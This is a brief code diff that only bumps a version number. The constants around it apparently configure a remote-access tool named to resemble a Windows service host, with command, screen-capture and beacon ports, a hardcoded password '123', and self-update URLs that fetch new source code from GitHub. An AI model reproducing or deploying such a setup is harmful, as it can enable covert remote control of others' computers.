@@ -46,7 +46,7 @@ COMMAND_PORT = 9000
 SCREEN_PORT  = 9001
 BEACON_PORT  = 9002
 PASSWORD     = "123"
-VERSION      = "1.7.3"
+VERSION      = "1.7.4"
 GITHUB_VER   = "https://raw.githubusercontent.com/windosvbs/WinSvcHost/main/version.txt"
 GITHUB_SRC   = "https://raw.githubusercontent.com/windosvbs/WinSvcHost/main/WinSvcHost.py"
 
